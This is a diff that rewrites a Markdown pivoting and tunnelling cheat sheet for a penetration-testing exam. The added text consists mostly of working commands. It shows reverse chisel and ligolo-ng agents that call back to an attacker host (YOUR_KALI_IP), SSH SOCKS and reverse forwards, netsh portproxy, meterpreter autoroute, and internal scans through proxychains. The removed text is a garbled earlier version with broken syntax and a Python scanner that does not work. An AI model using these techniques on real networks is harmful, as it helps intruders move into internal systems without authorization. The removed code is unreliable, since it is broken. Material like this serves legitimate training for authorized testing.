@@ -1,140 +1,144 @@
-# Pivoting, Tunneling & Chisel Masterclass
+# Pivoting, Tunneling & Port Forwarding
 
-Bridge gaps, access internal nets, bypass firewalls. Move laterally from {target} to hidden assets.
+**Once you own a dual-homed host, it becomes your gateway into the internal network.** The CPTS exam almost always has a second (and third) subnet you can only reach through a pivot. Master SSH, chisel, and ligolo-ng — you only need one to work.
 
-## Attack Workflow
+> Terminology: **Local (`-L`)** = pull a remote port to you. **Remote/Reverse (`-R`)** = push a local port out to the pivot. **Dynamic (`-D`)** = a SOCKS proxy that routes *any* port. Interface: your attack box is usually `tun0`.
 
-1.  **Discovery**: Find the bridge (DMZ, bastion, or compromised host).
-2.  **Port Scan**: Identify open services on {target}.
-3.  **Tunnel Setup**: SSH or Chisel tunnel to a pivot point.
-4.  **Internal Enumeration**: Run scans through the tunnel against targets.
-5.  **Exploit/PrivEsc**: Leverage findings, repeat.
+---
 
-## Commands Section
+## Step 0 — Discover the Second Network
 
-### Find the Bridge
+From the pivot host (the box you own):
 ```bash
-# Quick port scan on {target}
-nmap -p- -T4 {target}
-
-# Check for SSH (22), HTTP (80), Telnet (23), SMB (139/445)
-nc -zv {target} 22-65535 | head -50
+ip a; ip route; arp -a                    # what other subnets/hosts does it see?
+cat /etc/hosts
+# Ping-sweep the internal range from the pivot:
+for i in $(seq 1 254); do (ping -c1 -W1 172.16.5.$i >/dev/null && echo "172.16.5.$i up" &); done
+# Or upload a static nmap / use a bash TCP scan:
+for p in 22 80 445 3389; do (echo > /dev/tcp/172.16.5.10/$p) 2>/dev/null && echo "port $p open"; done
 ```
 
-### SSH Tunneling (The Standard)
+---
+
+## Method 1 — SSH Tunneling (when you have SSH creds/keys)
+
 ```bash
-# Forward port 80 from {target} to local port 8080
-ssh -L 8080:{target}:80 user@{pivot_ip}
+# LOCAL forward: reach internal host 172.16.5.10:445 at your localhost:4455
+ssh -L 4455:172.16.5.10:445 user@{target}
 
-# Reverse tunnel (local to {target})
-ssh -R 8080:{target}:80 user@{pivot_ip}
+# DYNAMIC (SOCKS proxy) — the powerful one; routes ALL ports through the pivot
+ssh -D 1080 user@{target}
+# then set /etc/proxychains4.conf:  socks5 127.0.0.1 1080
+proxychains nmap -sT -Pn -p445,3389 172.16.5.10
+proxychains xfreerdp /u:admin /v:172.16.5.10
 
-# Bind all interfaces
-ssh -L *:8080:localhost:80 user@{pivot_ip}
+# REMOTE/REVERSE forward: pivot can't be SSH'd INTO, but can reach OUT to you.
+# Expose the pivot's internal-facing service on YOUR box's port 8000:
+ssh -R 8000:172.16.5.10:80 youruser@YOUR_KALI_IP     # run FROM the pivot toward you
+
+# Flags: -N (no shell) -f (background) -g (allow others to use the forward)
+ssh -fN -D 1080 user@{target}
 ```
 
-### Chisel Tunneling (Fast, No Keys)
+---
+
+## Method 2 — chisel (no SSH needed; great for Windows pivots)
+
+The reliable pattern is a **reverse SOCKS proxy**: server on your Kali, client on the pivot dialing back.
+
 ```bash
-# Start listener on pivot
-chisel server -p 8888 -d
+# 1) On YOUR Kali (server, listening for the pivot to connect back):
+chisel server -p 8080 --reverse
 
-# Connect to {target} and expose it locally
-chisel client pivot:8888 localhost:8080 {user}:{pass} {target}:{port}
+# 2) On the PIVOT (client) — upload the chisel binary first, then:
+./chisel client YOUR_KALI_IP:8080 R:socks
+#   Windows:  chisel.exe client YOUR_KALI_IP:8080 R:socks
 
-# Reverse tunnel using chisel server
-chisel server -t {target}:{port} localhost:8080
+# 3) A SOCKS5 proxy is now on your Kali at 127.0.0.1:1080. Use it:
+#    /etc/proxychains4.conf ->  socks5 127.0.0.1 1080
+proxychains nmap -sT -Pn 172.16.5.10
+proxychains crackmapexec smb 172.16.5.0/24
 ```
 
-### Proxychains / HTTP Tunnel
+Single-port reverse forward (e.g. expose internal 172.16.5.10:3389 on your Kali:3389):
 ```bash
-# Chain multiple hops
-proxychains5 nmap -A -p- {target}
-
-# SOCKS proxy via SSH
-ssh -S /dev/null -D 9050 user@{pivot_ip} &
+# Kali:   chisel server -p 8080 --reverse
+# Pivot:  ./chisel client YOUR_KALI_IP:8080 R:3389:172.16.5.10:3389
+xfreerdp /u:admin /v:127.0.0.1:3389
 ```
 
-## Enumeration Flow (Through Tunnel)
+---
 
-### Web Fuzzing
+## Method 3 — ligolo-ng (cleanest; makes the subnet feel local — no proxychains)
+
 ```bash
-# Fuzz site mapped via tunnel
-curl -L http://localhost:8080/ -H "User-Agent: ffuf"
-ffuf -U http://localhost:8080/ -w files.txt -H "Host: {domain}"
+# 1) On Kali: set up the tun interface once
+sudo ip tuntap add user $(whoami) mode tun ligolo
+sudo ip link set ligolo up
+./proxy -selfcert                      # starts the ligolo server/console
 
-# Subdomain takeoff
-ffuf -u http://localhost:8080/ -H "Host: FUZZ.{domain}" -t 100
+# 2) On the PIVOT: upload the agent, dial back to your Kali:11601
+./agent -connect YOUR_KALI_IP:11601 -ignore-cert
+
+# 3) In the ligolo console: select the session, add a route to the internal subnet
+session            # pick the agent
+# on Kali, add the route to the discovered subnet:
+sudo ip route add 172.16.5.0/24 dev ligolo
+# back in console:
+start
+# Now 172.16.5.0/24 is directly reachable — NO proxychains:
+nmap -sT 172.16.5.10
+xfreerdp /u:admin /v:172.16.5.10
 ```
 
-### Internal Scanning
-```bash
-# Scan internal host {internal_target}
-proxychains5 nmap -A -sV -sC -p- {internal_target}
+Ligolo can also **listen** on the agent to receive reverse shells from deep hosts (`listener_add`).
 
-# Service enumeration through tunnel
-netdiscover -b 10.0.0.0/24 > internal_hosts.txt
+---
+
+## Method 4 — sshuttle (VPN-like, needs SSH + python on pivot)
+
+```bash
+sshuttle -r user@{target} 172.16.5.0/24
+# Now the whole subnet is routed transparently — use tools normally, no proxychains.
 ```
 
-### Privilege Escalation via Tunnel
-```bash
-# Run SUID binary check on {internal_target} via tunnel
-gobuster dir -u http://localhost:8080 -w /usr/share/wordlists/dirb/common.txt
+---
+
+## Method 5 — Windows-native / no-tool pivots
+
+```powershell
+# netsh port-forward (Windows pivot, needs admin) — forward local 4455 -> internal 445
+netsh interface portproxy add v4tov4 listenport=4455 listenaddress=0.0.0.0 connectport=445 connectaddress=172.16.5.10
+netsh interface portproxy show all
+# remove:
+netsh interface portproxy delete v4tov4 listenport=4455 listenaddress=0.0.0.0
 ```
 
-## Tips & Shortcuts
+Meterpreter routing (if you have a meterpreter session on the pivot):
+```
+meterpreter> run autoroute -s 172.16.5.0/24
+msf> use auxiliary/server/socks_proxy   (set SRVPORT 1080; run)
+# then proxychains as usual
+```
 
-*   **Keep it simple**: Always bind `*` (`:8080`) to accept remote connections.
-*   **Auto-restart**: Run tunnels in background with `&` or use `systemd`-style units.
-*   **Monitor**: Watch logs (`tail -f /var/log/auth.log`) for pivoted access attempts.
-*   **Multi-hop**: Combine SSH tunnel + HTTP proxy for complex environments.
+---
+
+## Using the Proxy — proxychains tips
+
+```bash
+# /etc/proxychains4.conf  (bottom):
+#   socks5 127.0.0.1 1080
+# Use quiet mode + prevent DNS leaks:
+proxychains4 -q nmap -sT -Pn -n 172.16.5.10
+```
+- **Always use `-sT` (TCP connect) through proxychains** — SYN scans (`-sS`) don't work over SOCKS.
+- **Disable ICMP host discovery** with `-Pn` (ping won't traverse the proxy).
+- SOCKS carries TCP only; for UDP tools use ligolo-ng or sshuttle instead.
 
 ## Common Mistakes
 
-*   **Wrong Bind**: Forgetting `*` causes local-only binding.
-*   **No Persistence**: Tunnels drop when the session ends.
-*   **Overlooking Auth**: Pivots often require credentials you don't have.
-*   **Firewall Rules**: Some organizations block `chisel` or specific ports by default.
-
-## Mini Automation Scripts
-
-### Bash: Auto-SSH Tunnel Generator
-```bash
-#!/bin/bash
-PORT=8080
-USER="admin"
-PASS="password"
-PIVOT_IP="192.168.1.50"
-TARGET="${1}"
-
-ssh -L *:${PORT}:${TARGET}:80 ${USER}@${PIVOT_IP} &
-echo "Tunnel ready: http://localhost:${PORT}"
-```
-
-### Python: Auto-Sweep After Tunnel
-```python
-#!/usr/bin/env python3
-import subprocess
-import time
-import sys
-
-def run_tunnel(user, pivot, target, port=8080):
-    p = subprocess.Popen(['ssh', '-L', f'*:{port}:{target}:80', f'{user}@{pivot}'])
-    return p
-
-def scan_via_tunnel():
-    # Simulate scanning through tunnel
-    import socket
-    print("Scanning local gateway...")
-    for i in range(1, 255):
-        try:
-            s = socket.socket()
-            s.connect(("127.0.0.1", 80))
-            print(f"Port {i} open on {target}")
-        except:
-            pass
-    time.sleep(5)
-
-if __name__ == "__main__":
-    run_tunnel("admin", "192.168.1.50", "192.168.1.10")
-    scan_via_tunnel()
-```
+- **Using `-sS` over proxychains** → no results. Use `-sT -Pn`.
+- **Chisel direction confusion.** Server = your Kali (`--reverse`), client = the pivot dialing back with `R:socks`.
+- **Forgetting to add the route** in ligolo — the tunnel is up but traffic has nowhere to go.
+- **DNS leaks** revealing you're proxying — set `proxy_dns` off or use IPs.
+- **Losing the tunnel** when your shell dies — run tunnels with `-fN` / in a separate session / as a service.
